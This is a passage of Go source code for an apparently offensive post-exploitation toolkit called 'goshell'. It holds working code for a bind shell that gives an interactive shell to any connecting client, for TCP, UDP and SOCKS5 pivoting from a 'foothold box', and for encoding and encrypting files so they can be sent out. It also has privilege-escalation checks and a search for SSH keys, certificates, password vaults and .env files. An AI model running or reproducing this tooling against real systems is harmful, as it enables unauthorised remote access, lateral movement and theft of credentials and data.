		return fmt.Errorf("giving up after %d attempts: %w", cfg.RetryMax+1, lastErr)
	}
	return nil
}

func cmdBindShell(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("bind", flag.ContinueOnError)
	port := fs.Int("p", 4444, "port to listen on")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *port < 1 || *port > 65535 {
		return fmt.Errorf("port %d out of range", *port)
	}
	ln, err := listen(ctx, fmt.Sprintf(":%d", *port))
	if err != nil {
		return err
	}
	defer func() { _ = ln.Close() }()
	slog.Info("listening (dual-stack, Ctrl-C to stop)", "port", *port)
	for {
		conn, err := ln.Accept()
		if err != nil {
			return ctx.Err()
		}
		go interactiveShell(ctx, conn)
	}
}

func interactiveShell(ctx context.Context, c net.Conn) {
	defer func() { _ = c.Close() }()
	var shell string
	var shellArgs []string
	if runtime.GOOS == "windows" {
		shell, shellArgs = "cmd.exe", []string{"/Q"}
	} else {
		shell, shellArgs = "/bin/sh", []string{"-i"}
	}
	cmd := exec.CommandContext(ctx, shell, shellArgs...)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Env = append(os.Environ(), "TERM=dumb")
	_ = cmd.Run()
}

// ===========================================================================
// 9. pivot: udprelay / fwd (TCP port forward)
// ===========================================================================

func cmdUdpRelay(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("udprelay", flag.ContinueOnError)
	listenAddr := fs.String("l", ":9000", "local UDP listen address")
	target := fs.String("d", "", "destination host:port")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *target == "" {
		fs.Usage()
		return errors.New("udprelay requires -d")
	}
	raddr, err := net.ResolveUDPAddr("udp", *target)
	if err != nil {
		return err
	}
	laddr, err := net.ResolveUDPAddr("udp", *listenAddr)
	if err != nil {
		return err
	}
	pc, err := net.ListenUDP("udp", laddr)
	if err != nil {
		return err
	}
	defer func() { _ = pc.Close() }()
	go func() {
		<-ctx.Done()
		_ = pc.Close()
	}()
	slog.Info("UDP relay (session-aware)", "listen", *listenAddr, "target", *target)
	buf := make([]byte, 65535)
	var lastClient *net.UDPAddr // single active client at a time
	for {
		n, from, err := pc.ReadFromUDP(buf)
		if err != nil {
			return ctx.Err()
		}
		if from.String() == raddr.String() {
			// datagram from the target → send to the last client
			if lastClient != nil {
				if _, err := pc.WriteToUDP(buf[:n], lastClient); err != nil {
					return err
				}
			}
			continue
		}
		// datagram from a client → remember it and forward to the target
		lastClient = from
		if _, err := pc.WriteToUDP(buf[:n], raddr); err != nil {
			return err
		}
	}
}

// fwd — bidirectional TCP port forward: listen locally, relay to target.
func cmdFwd(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("fwd", flag.ContinueOnError)
	lport := fs.Int("l", 1080, "local listen port")
	target := fs.String("d", "", "destination host:port")
	tlsOn := fs.Bool("tls", false, "TLS 1.2+ to upstream")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *target == "" {
		fs.Usage()
		return errors.New("fwd requires -d")
	}
	if *lport < 1 || *lport > 65535 {
		return fmt.Errorf("port %d out of range", *lport)
	}
	ln, err := listen(ctx, fmt.Sprintf(":%d", *lport))
	if err != nil {
		return err
	}
	defer func() { _ = ln.Close() }()
	slog.Info("forwarding", "listen_port", *lport, "target", *target, "tls", *tlsOn)
	for {
		in, err := ln.Accept()
		if err != nil {
			return ctx.Err()
		}
		go relay(ctx, cfg, in, *target, *tlsOn)
	}
}

// relay pipes one accepted connection to the upstream target; the per-conn
// context ensures both directions tear down when either side finishes.
func relay(ctx context.Context, cfg Config, in net.Conn, target string, tlsOn bool) {
	defer func() { _ = in.Close() }()
	out, err := dialContext(ctx, cfg, "tcp", target, tlsOn)
	if err != nil {
		slog.Warn("upstream dial failed", "err", err)
		return
	}
	defer func() { _ = out.Close() }()
	cctx, cancel := context.WithCancel(ctx)
	defer cancel()
	go func() { _, _ = io.Copy(out, in); cancel() }()
	go func() { _, _ = io.Copy(in, out); cancel() }()
	<-cctx.Done()
}

// ===========================================================================
// 10. utility: exfil / http / hash / aes / zip / doctor
// ===========================================================================

// socks5 — a SOCKS5 CONNECT proxy (RFC 1928), no-auth method only. This is
// the classic pivot: run it on a foothold box, then point proxychains /
// browser / curl at it to reach internal hosts from your workstation.
// Supports IPv4, IPv6 and domain targets, dual-stack, TLS-wrapped inbound
// with -tls if the listener itself must be encrypted.
func cmdSocks5(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("socks5", flag.ContinueOnError)
	lport := fs.Int("p", 1080, "listen port")
	tlsOn := fs.Bool("tls", false, "wrap the listener in TLS 1.2+ (e.g. for open internet hops)")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *lport < 1 || *lport > 65535 {
		return fmt.Errorf("port %d out of range", *lport)
	}
	var ln net.Listener
	var err error
	if *tlsOn {
		cert, cerr := selfSignedCert()
		if cerr != nil {
			return cerr
		}
		tlsCfg := &tls.Config{MinVersion: tls.VersionTLS12, Certificates: []tls.Certificate{cert}}
		ln, err = tls.Listen("tcp", fmt.Sprintf(":%d", *lport), tlsCfg)
		if err != nil {
			return err
		}
		go func() { <-ctx.Done(); _ = ln.Close() }()
	} else {
		ln, err = listen(ctx, fmt.Sprintf(":%d", *lport))
		if err != nil {
			return err
		}
	}
	defer func() { _ = ln.Close() }()
	slog.Info("socks5 CONNECT proxy listening", "port", *lport, "tls", *tlsOn)
	for {
		conn, err := ln.Accept()
		if err != nil {
			return ctx.Err()
		}
		go socks5Session(ctx, cfg, conn)
	}
}

// socks5Session implements one CONNECT negotiation + pipe.
func socks5Session(ctx context.Context, cfg Config, c net.Conn) {
	defer func() { _ = c.Close() }()
	_ = c.SetDeadline(time.Now().Add(30 * time.Second)) // handshake timeout

	// greeting: VER NMETHODS METHODS...
	hdr := make([]byte, 2)
	if _, err := io.ReadFull(c, hdr); err != nil || hdr[0] != 0x05 {
		return
	}
	methods := make([]byte, hdr[1])
	if _, err := io.ReadFull(c, methods); err != nil {
		return
	}
	noAuth := false
	for _, m := range methods {
		if m == 0x00 {
			noAuth = true
		}
	}
	if !noAuth {
		_, _ = c.Write([]byte{0x05, 0xFF}) // no acceptable methods
		return
	}
	if _, err := c.Write([]byte{0x05, 0x00}); err != nil {
		return
	}

	// request: VER CMD RSV ATYP DST.ADDR DST.PORT
	req := make([]byte, 4)
	if _, err := io.ReadFull(c, req); err != nil || req[0] != 0x05 || req[1] != 0x01 {
		return // only CONNECT (0x01) is supported
	}
	var host string
	switch req[3] {
	case 0x01: // IPv4
		b := make([]byte, 4)
		if _, err := io.ReadFull(c, b); err != nil {
			return
		}
		host = net.IP(b).String()
	case 0x03: // domain name
		l := make([]byte, 1)
		if _, err := io.ReadFull(c, l); err != nil {
			return
		}
		b := make([]byte, l[0])
		if _, err := io.ReadFull(c, b); err != nil {
			return
		}
		host = string(b)
	case 0x04: // IPv6
		b := make([]byte, 16)
		if _, err := io.ReadFull(c, b); err != nil {
			return
		}
		host = net.IP(b).String()
	default:
		return
	}
	pb := make([]byte, 2)
	if _, err := io.ReadFull(c, pb); err != nil {
		return
	}
	port := binary.BigEndian.Uint16(pb)

	// reply success before connecting is disallowed by the RFC in spirit but
	// common practice is: connect, then reply with the bound address.
	_ = c.SetDeadline(time.Time{}) // clear handshake deadline for the dial
	dst, err := dialContext(ctx, cfg, "tcp", net.JoinHostPort(host, strconv.Itoa(int(port))), false)
	if err != nil {
		_, _ = c.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // general failure
		return
	}
	defer func() { _ = dst.Close() }()
	// reply: VER REP(0) RSV ATYP(1) BND.ADDR(0.0.0.0) BND.PORT(0)
	if _, err := c.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0}); err != nil {
		return
	}
	slog.Info("socks5 tunnel", "client", c.RemoteAddr().String(),
		"target", net.JoinHostPort(host, strconv.Itoa(int(port))))

	pipeConns(c, dst)
}

// pipeConns copies bidirectionally until either side closes.
func pipeConns(a, b net.Conn) {
	done := make(chan struct{}, 2)
	go func() { _, _ = io.Copy(b, a); done <- struct{}{} }()
	go func() { _, _ = io.Copy(a, b); done <- struct{}{} }()
	<-done
}

// selfSignedCert generates an in-memory self-signed certificate for the
// -tls listener options (socks5/listen). It is created per-run and used only
// to encrypt the channel; clients must pin/skip verification deliberately.
func selfSignedCert() (tls.Certificate, error) {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return tls.Certificate{}, err
	}
	tmpl := x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "goshell"},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}
	der, err := x509.CreateCertificate(rand.Reader, &tmpl, &tmpl, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, err
	}
	return tls.Certificate{
		Certificate: [][]byte{der},
		PrivateKey:  key,
	}, nil
}

// send — transfer a file to a goshell `listen` receiver over TCP (optionally
// TLS 1.2+). Protocol: "GSND" || 8-byte BE size || 2-byte BE name length ||
// name || data || sender half-closes; receiver replies "OK".
func cmdSend(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("send", flag.ContinueOnError)
	addr := fs.String("a", "", "receiver host:port")
	file := fs.String("f", "", "file to send")
	tlsOn := fs.Bool("tls", false, "TLS 1.2+ transport")
	retry := fs.Bool("retry", true, "retry with backoff until receiver is up")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *addr == "" || *file == "" {
		fs.Usage()
		return errors.New("send requires -a and -f")
	}
	data, err := os.ReadFile(*file)
	if err != nil {
		return err
	}
	name := filepath.Base(*file)
	var attempt int
	for {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		conn, err := dialContext(ctx, cfg, "tcp", *addr, *tlsOn)
		if err != nil {
			if !*retry {
				return err
			}
			wait := jitteredBackoff(attempt, cfg.RetryBase)
			slog.Warn("send dial failed; backing off", "err", err, "wait", wait.String())
			attempt++
			select {
			case <-time.After(wait):
				continue
			case <-ctx.Done():
				return ctx.Err()
			}
		}
		hdr := make([]byte, 0, 4+8+2+len(name))
		hdr = append(hdr, "GSND"...)
		var size [8]byte
		binary.BigEndian.PutUint64(size[:], uint64(len(data)))
		hdr = append(hdr, size[:]...)
		var nl [2]byte
		binary.BigEndian.PutUint16(nl[:], uint16(len(name)))
		hdr = append(hdr, nl[:]...)
		hdr = append(hdr, name...)
		if _, err := io.Copy(conn, bytes.NewReader(hdr)); err != nil {
			_ = conn.Close()
			return fmt.Errorf("write transfer header: %w", err)
		}
		if _, err := io.Copy(conn, bytes.NewReader(data)); err != nil {
			_ = conn.Close()
			return fmt.Errorf("write transfer payload: %w", err)
		}
		_ = conn.SetReadDeadline(time.Now().Add(15 * time.Second))
		ack := make([]byte, 2)
		if _, err := io.ReadFull(conn, ack); err != nil {
			_ = conn.Close()
			return fmt.Errorf("no ack from receiver: %w", err)
		}
		_ = conn.Close()
		if string(ack) != "OK" {
			return fmt.Errorf("receiver NAK: %q", ack)
		}
		fmt.Printf("sent %s (%d bytes) → %s\n", name, len(data), *addr)
		return nil
	}
}

// listen — receive a file from `goshell send`. One file per run by default;
// -many keeps accepting until Ctrl-C.
func cmdListen(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("listen", flag.ContinueOnError)
	port := fs.Int("p", 9001, "listen port")
	outDir := fs.String("o", ".", "directory to write received files into")
	tlsOn := fs.Bool("tls", false, "TLS 1.2+ transport (expect sender -tls)")
	many := fs.Bool("many", false, "keep accepting files until cancelled")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *port < 1 || *port > 65535 {
		return fmt.Errorf("port %d out of range", *port)
	}
	if err := os.MkdirAll(*outDir, 0o750); err != nil {
		return err
	}
	var ln net.Listener
	var err error
	if *tlsOn {
		cert, cerr := selfSignedCert()
		if cerr != nil {
			return cerr
		}
		ln, err = tls.Listen("tcp", fmt.Sprintf(":%d", *port),
			&tls.Config{MinVersion: tls.VersionTLS12, Certificates: []tls.Certificate{cert}})
		if err != nil {
			return err
		}
		go func() { <-ctx.Done(); _ = ln.Close() }()
	} else {
		ln, err = listen(ctx, fmt.Sprintf(":%d", *port))
		if err != nil {
			return err
		}
	}
	defer func() { _ = ln.Close() }()
	slog.Info("receiving files", "port", *port, "dir", *outDir, "tls", *tlsOn)
	for {
		conn, err := ln.Accept()
		if err != nil {
			return ctx.Err()
		}
		if err := recvFile(conn, *outDir); err != nil {
			slog.Warn("receive failed", "err", err)
		}
		_ = conn.Close()
		if !*many {
			return nil
		}
	}
}

func recvFile(conn net.Conn, dir string) error {
	_ = conn.SetDeadline(time.Now().Add(30 * time.Second))
	magic := make([]byte, 4)
	if _, err := io.ReadFull(conn, magic); err != nil {
		return err
	}
	if string(magic) != "GSND" {
		return errors.New("bad protocol header")
	}
	var sz [8]byte
	if _, err := io.ReadFull(conn, sz[:]); err != nil {
		return err
	}
	size := binary.BigEndian.Uint64(sz[:])
	var nl [2]byte
	if _, err := io.ReadFull(conn, nl[:]); err != nil {
		return err
	}
	name := make([]byte, binary.BigEndian.Uint16(nl[:]))
	if _, err := io.ReadFull(conn, name); err != nil {
		return err
	}
	// zip-slip guard: only a bare filename is accepted
	if string(name) != filepath.Base(string(name)) || strings.ContainsAny(string(name), `/\`) {
		return fmt.Errorf("unsafe filename %q", name)
	}
	if size > 1<<40 { // 1 TiB sanity cap
		return fmt.Errorf("implausible size %d", size)
	}
	dest := filepath.Join(dir, string(name))
	if fi, statErr := os.Lstat(dest); statErr == nil {
		if fi.Mode()&os.ModeSymlink != 0 {
			return fmt.Errorf("refusing to write through symlink %q", dest)
		}
		return fmt.Errorf("destination already exists: %q", dest)
	} else if !errors.Is(statErr, os.ErrNotExist) {
		return statErr
	}
	f, err := os.OpenFile(dest, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0o600)
	if err != nil {
		return err
	}
	if _, err := io.CopyN(f, conn, int64(size)); err != nil {
		_ = f.Close()
		return err
	}
	if err := f.Close(); err != nil {
		return err
	}
	_, _ = conn.Write([]byte("OK"))
	fmt.Printf("received %s (%d bytes) → %s\n", name, size, dest)
	return nil
}

func cmdExfil(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("exfil", flag.ContinueOnError)
	decode := fs.Bool("d", false, "decode instead of encode")
	hexMode := fs.Bool("hex", false, "use hex instead of base64")
	file := fs.String("f", "", "read from file instead of stdin")
	chunk := fs.Int("chunk", 0, "split into labeled chunks of N chars")
	aesPass := fs.String("aes", "", "AES-256-GCM layer with this passphrase")
	xorKey := fs.String("xor", "", "XOR layer with this key (string)")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *chunk < 0 {
		return errors.New("chunk must be >= 0")
	}
	var in []byte
	var err error
	if *file != "" {
		in, err = os.ReadFile(*file)
	} else {
		in, err = io.ReadAll(os.Stdin)
	}
	if err != nil {
		return err
	}
	if *decode {
		s := string(in)
		// strip labeled chunk prefixes ("003:…") before decoding
		if strings.Contains(s, "\n") && regexpChunkPrefix.MatchString(s) {
			var lines []string
			for _, line := range strings.Split(strings.TrimSpace(s), "\n") {
				if m := regexpChunkPrefix.FindStringSubmatch(line); m != nil {
					line = m[1]
				}
				lines = append(lines, line)
			}
			s = strings.Join(lines, "")
		}
		var raw []byte
		s = strings.TrimSpace(s)
		if *hexMode {
			raw, err = hex.DecodeString(s)
		} else {
			raw, err = base64.StdEncoding.DecodeString(s)
		}
		if err != nil {
			return err
		}
		// unwrap layers in reverse order of encoding: xor → aes
		if *xorKey != "" {
			raw = xorBytes(raw, []byte(*xorKey))
		}
		if *aesPass != "" {
			raw, err = aesDecrypt(raw, *aesPass)
			if err != nil {
				return err
			}
		}
		_, err = os.Stdout.Write(raw)
		return err
	}
	// wrap layers in order: aes → xor, then base64/hex on the outside
	data := in
	if *aesPass != "" {
		data, err = aesEncrypt(data, *aesPass)
		if err != nil {
			return err
		}
	}
	if *xorKey != "" {
		data = xorBytes(data, []byte(*xorKey))
	}
	var out string
	if *hexMode {
		out = hex.EncodeToString(data)
	} else {
		out = base64.StdEncoding.EncodeToString(data)
	}
	if *chunk > 0 {
		for i, r := 0, 0; i < len(out); i, r = i+*chunk, r+1 {
			end := min(i+*chunk, len(out))
			fmt.Printf("%03d:%s\n", r, out[i:end])
		}
		return nil
	}
	fmt.Println(out)
	return nil
}

// regexpChunkPrefix matches the labeled chunk lines produced by -chunk
// encoding ("003:data…") so decoding is the exact inverse of encoding.
var regexpChunkPrefix = regexp.MustCompile(`(?m)^[0-9]{1,3}:(.*)$`)

// xorBytes — repeating-key XOR (lightweight layer; not a substitute for AES).
func xorBytes(data, key []byte) []byte {
	if len(key) == 0 {
		return data
	}
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out
}

// pbkdf2Key derives a 32-byte key with PBKDF2-HMAC-SHA256, 600k iterations
// (OWASP 2024 guidance). Implemented directly on crypto/hmac so it works on
// every Go toolchain without golang.org/x/crypto.
func pbkdf2Key(password, salt []byte) []byte {
	const iter = 600_000
	prf := hmac.New(sha256.New, password)
	hashLen := prf.Size()
	numBlocks := (32 + hashLen - 1) / hashLen
	out := make([]byte, 0, numBlocks*hashLen)
	var ctr [4]byte
	for i := 1; i <= numBlocks; i++ {
		prf.Reset()
		prf.Write(salt)
		binary.BigEndian.PutUint32(ctr[:], uint32(i))
		prf.Write(ctr[:])
		u := prf.Sum(nil)
		t := make([]byte, len(u))
		copy(t, u)
		for j := 2; j <= iter; j++ {
			prf.Reset()
			prf.Write(u)
			u = prf.Sum(u[:0])
			for k := range u {
				t[k] ^= u[k]
			}
		}
		out = append(out, t...)
	}
	return out[:32]
}

// Ciphertext envelope, version 1:
//
//	"GSH1" || 16-byte salt || 12-byte nonce || AES-256-GCM ciphertext+tag
//
// The salt defeats passphrase precomputation; the magic prefix makes the
// format self-describing and format errors explicit.
var aesMagic = []byte("GSH1")

func aesEncrypt(data []byte, pass string) ([]byte, error) {
	salt := make([]byte, 16)
	if _, err := rand.Read(salt); err != nil {
		return nil, err
	}
	key := pbkdf2Key([]byte(pass), salt)
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	out := make([]byte, 0, len(aesMagic)+len(salt)+gcm.NonceSize()+len(data)+gcm.Overhead())
	out = append(out, aesMagic...)
	out = append(out, salt...)
	out = append(out, nonce...)
	return gcm.Seal(out, nonce, data, nil), nil
}

func aesDecrypt(data []byte, pass string) ([]byte, error) {
	const hdr = 4 + 16 // magic + salt
	if len(data) < hdr {
		return nil, errors.New("ciphertext too short")
	}
	if !bytes.Equal(data[:4], aesMagic) {
		return nil, errors.New("unrecognized ciphertext format (expected GSH1 envelope)")
	}
	key := pbkdf2Key([]byte(pass), data[4:hdr])
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	body := data[hdr:]
	if len(body) < gcm.NonceSize() {
		return nil, errors.New("ciphertext too short")
	}
	return gcm.Open(nil, body[:gcm.NonceSize()], body[gcm.NonceSize():], nil)
}
func cmdHttpServe(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("http", flag.ContinueOnError)
	dir := fs.String("dir", ".", "directory to serve")
	port := fs.Int("p", 8000, "port")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *port < 1 || *port > 65535 {
		return fmt.Errorf("port %d out of range", *port)
	}
	abs, _ := filepath.Abs(*dir)
	srv := &http.Server{
		Addr:              fmt.Sprintf(":%d", *port),
		Handler:           http.FileServer(http.Dir(*dir)),
		ReadHeaderTimeout: 10 * time.Second, // slowloris guard
		IdleTimeout:       120 * time.Second,
		ReadTimeout:       0, // file transfers may be long
		MaxHeaderBytes:    1 << 16,
	}
	go func() {
		<-ctx.Done()
		sctx, c := context.WithTimeout(context.Background(), 5*time.Second)
		defer c()
		_ = srv.Shutdown(sctx)
	}()
	slog.Info("serving", "dir", abs, "url", fmt.Sprintf("http://0.0.0.0:%d/", *port))
	err := srv.ListenAndServe()
	if errors.Is(err, http.ErrServerClosed) {
		return nil
	}
	return err
}

// hash — MD5 and SHA-256 of files (integrity / known-good comparison).
func cmdHash(ctx context.Context, cfg Config, args []string) error {
	if len(args) < 1 {
		return errors.New("usage: goshell hash <file> [file2 ...]")
	}
	for _, p := range args {
		f, err := os.Open(p)
		if err != nil {
			fmt.Fprintf(os.Stderr, "skip %s: %v\n", p, err)
			continue
		}
		m := md5.New()
		s := sha256.New()
		_, err = io.Copy(io.MultiWriter(m, s), f)
		_ = f.Close()
		if err != nil {
			return err
		}
		fmt.Printf("%s  md5=%x  sha256=%x\n", p, m.Sum(nil), s.Sum(nil))
	}
	return nil
}

// aes — AES-256-GCM file encrypt/decrypt for safe transport of collected
// data. Key derivation: PBKDF2-HMAC-SHA256, 600k iterations, per-file salt.
// Old v0.3/v0.4 files (raw nonce||ct, SHA-256 KDF) are no longer readable.
func cmdAES(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("aes", flag.ContinueOnError)
	file := fs.String("f", "", "input file")
	out := fs.String("o", "", "output file (default: input + .enc / strip .enc)")
	pass := fs.String("p", "", "passphrase")
	decrypt := fs.Bool("d", false, "decrypt instead of encrypt")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *file == "" || *pass == "" {
		fs.Usage()
		return errors.New("aes requires -f and -p")
	}
	in, err := os.ReadFile(*file)
	if err != nil {
		return err
	}
	var outPath string
	switch {
	case *out != "":
		outPath = *out
	case *decrypt:
		outPath = strings.TrimSuffix(*file, ".enc")
	default:
		outPath = *file + ".enc"
	}
	var data []byte
	if *decrypt {
		data, err = aesDecrypt(in, *pass)
		if err != nil {
			return fmt.Errorf("decrypt failed (wrong passphrase?): %w", err)
		}
	} else {
		data, err = aesEncrypt(in, *pass)
		if err != nil {
			return err
		}
	}
	if err := os.WriteFile(outPath, data, 0o600); err != nil {
		return err
	}
	fmt.Printf("%s → %s (%d bytes, AES-256-GCM)\n", *file, outPath, len(data))
	return nil
}

// zip — create/extract archives (collect files for transport).
func cmdZip(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("zip", flag.ContinueOnError)
	archive := fs.String("a", "", "archive path")
	extract := fs.Bool("x", false, "extract archive instead of create")
	dir := fs.String("dir", ".", "directory to archive (create) / extract into")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	if *archive == "" {
		fs.Usage()
		return errors.New("zip requires -a")
	}
	if *extract {
		return unzipTo(*archive, *dir)
	}
	return zipDir(*archive, *dir)
}

func zipDir(archive, dir string) error {
	f, err := os.Create(archive)
	if err != nil {
		return err
	}
	defer func() { _ = f.Close() }()
	w := zip.NewWriter(f)
	defer func() { _ = w.Close() }()
	return filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			return nil
		}
		rel, err := filepath.Rel(dir, path)
		if err != nil {
			return err
		}
		src, err := os.Open(path)
		if err != nil {
			return err
		}
		defer func() { _ = src.Close() }()
		fw, err := w.Create(filepath.ToSlash(rel))
		if err != nil {
			return err
		}
		_, err = io.Copy(fw, src)
		return err
	})
}

func unzipTo(archive, dir string) error {
	r, err := zip.OpenReader(archive)
	if err != nil {
		return err
	}
	defer func() { _ = r.Close() }()
	root := filepath.Clean(dir)
	for _, f := range r.File {
		// zip-slip protection: refuse paths escaping the target dir
		clean := filepath.Clean(filepath.Join(root, f.Name))
		if clean != root && !strings.HasPrefix(clean, root+string(os.PathSeparator)) {
			return fmt.Errorf("unsafe path in archive: %s", f.Name)
		}
		if f.FileInfo().IsDir() {
			if err := os.MkdirAll(clean, 0o750); err != nil {
				return err
			}
			continue
		}
		if err := os.MkdirAll(filepath.Dir(clean), 0o750); err != nil {
			return err
		}
		src, err := f.Open()
		if err != nil {
			return err
		}
		dst, err := os.OpenFile(clean, os.O_CREATE|os.O_WRONLY, f.Mode().Perm())
		if err != nil {
			_ = src.Close()
			return err
		}
		_, err = io.Copy(dst, src)
		_ = src.Close()
		if cerr := dst.Close(); err == nil {
			err = cerr
		}
		if err != nil {
			return err
		}
		fmt.Println("extracted", clean)
	}
	return nil
}

func cmdDoctor(ctx context.Context, cfg Config, args []string) error {
	checks := []struct {
		name string
		fn   func() error
	}{
		{"tls 1.3 support", func() error {
			if tls.VersionName(tls.VersionTLS13) == "TLS 1.3" {
				return nil
			}
			return errors.New("tls 1.3 unavailable")
		}},
		{"loopback listener+dial", func() error {
			ctx2, cancel := context.WithTimeout(ctx, 2*time.Second)
			defer cancel()
			ln, err := listen(ctx2, "127.0.0.1:0")
			if err != nil {
				return err
			}
			defer func() { _ = ln.Close() }()
			c, err := dialContext(ctx2, cfg, "tcp",
				ln.Addr().String(), false)
			if err != nil {
				return err
			}
			_ = c.Close()
			return nil
		}},
		{"backoff jitter", func() error {
			if d := jitteredBackoff(0, 100*time.Millisecond); d >= 0 && d <= 100*time.Millisecond {
				return nil
			}
			return errors.New("interval out of range")
		}},
		{"port parser", func() error {
			p, err := parsePorts("1-10,80,443,443")
			if err != nil {
				return err
			}
			if len(p) != 12 {
				return fmt.Errorf("expected 12 ports, got %d", len(p))
			}
			return nil
		}},
		{"64-bit time (2040)", func() error {
			future := time.Date(2040, 1, 1, 0, 0, 0, 0, time.UTC)
			if future.Format(time.RFC3339) == "2040-01-01T00:00:00Z" {
				return nil
			}
			return errors.New("formatting failed")
		}},
		{"cidr parser", func() error {
			if p, err := netip.ParsePrefix("192.168.1.0/24"); err != nil || p.Bits() != 24 {
				return errors.New("bad parse")
			}
			return nil
		}},
		{"aes round-trip", func() error {
			ct, err := aesEncrypt([]byte("doctor"), "probe")
			if err != nil {
				return err
			}
			pt, err := aesDecrypt(ct, "probe")
			if err != nil || string(pt) != "doctor" {
				return errors.New("round-trip mismatch")
			}
			return nil
		}},
	}
	ok := true
	for _, c := range checks {
		if err := c.fn(); err != nil {
			ok = false
			fmt.Printf("[-] %-30s %v\n", c.name, err)
		} else {
			fmt.Printf("[+] %-30s ok\n", c.name)
		}
	}
	if !ok {
		return errors.New("self-test failed")
	}
	fmt.Println("\nself-test PASSED")
	return nil
}

// ===========================================================================
// 11. privesc: privesc / tasks / fw
// ===========================================================================

func cmdPrivesc(ctx context.Context, cfg Config, args []string) error {
	fmt.Println("=== Privilege Escalation Audit ===")
	fmt.Println()
	if runtime.GOOS == "windows" {
		windowsPrivesc(ctx)
	} else {
		unixPrivesc(ctx)
	}
	return ctx.Err()
}

func windowsPrivesc(ctx context.Context) {
	for _, k := range []string{`HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`,
		`HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`} {
		out, err := exec.CommandContext(ctx, "reg", "query", k, "/v", "AlwaysInstallElevated").Output()
		if err != nil || !strings.Contains(string(out), "0x1") {
			fmt.Printf("[-] %s\\AlwaysInstallElevated not set (good)\n", k)
			continue
		}
		fmt.Printf("[+] %s\\AlwaysInstallElevated ENABLED — msiexec privesc path\n", k)
	}
	fmt.Println("\n[*] Also review: unquoted service paths (wmic service get name,pathname),")
	fmt.Println("    writable service binaries (accesschk), scheduled tasks, MSIs.")
}

func unixPrivesc(ctx context.Context) {
	checks := [][2]string{
		{"SUID binaries", "find / -perm -4000 -type f 2>/dev/null"},
		{"Writable /etc files", "find /etc -writable -type f 2>/dev/null"},
		{"Cron jobs", "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null"},
		{"Capabilities", "getcap -r / 2>/dev/null"},
		{"World-writable dirs in PATH", "echo $PATH | tr ':' '\\n' | xargs -I{} find {} -writable -type d 2>/dev/null"},
	}
	for _, c := range checks {
		fmt.Printf("\n[*] %s:\n", c[0])
		_ = runCmd(ctx, "sh", "-c", c[1])
	}
}

// tasks — list scheduled tasks/cron (audit for weak persistence points).
func cmdTasks(ctx context.Context, cfg Config, args []string) error {
	if runtime.GOOS == "windows" {
		return runCmd(ctx, "schtasks", "/query", "/fo", "LIST", "/v")
	}
	return runCmd(ctx, "sh", "-c",
		"cat /etc/crontab 2>/dev/null; for u in $(cut -f1 -d: /etc/passwd); do crontab -l -u $u 2>/dev/null; done; ls -la /etc/cron.* 2>/dev/null")
}

// fw — firewall state audit.
func cmdFirewall(ctx context.Context, cfg Config, args []string) error {
	if runtime.GOOS == "windows" {
		return runCmd(ctx, "netsh", "advfirewall", "show", "allprofiles")
	}
	return runCmd(ctx, "sh", "-c",
		"iptables -L -n 2>/dev/null; nft list ruleset 2>/dev/null; ufw status verbose 2>/dev/null")
}

// ===========================================================================
// 12. filesystem: hunt — locate sensitive/config files (audit exposure)
// ===========================================================================

func cmdHunt(ctx context.Context, cfg Config, args []string) error {
	fs := flag.NewFlagSet("hunt", flag.ContinueOnError)
	root := fs.String("r", string(filepath.Separator), "root directory")
	if err := parseFlags(fs, args); err != nil {
		fs.Usage()
		return err
	}
	// Interesting names only — this is an exposure audit, not content scraping.
	patterns := []string{
		"id_rsa", "id_ed25519", ".pem", ".key", ".kdbx", ".env",
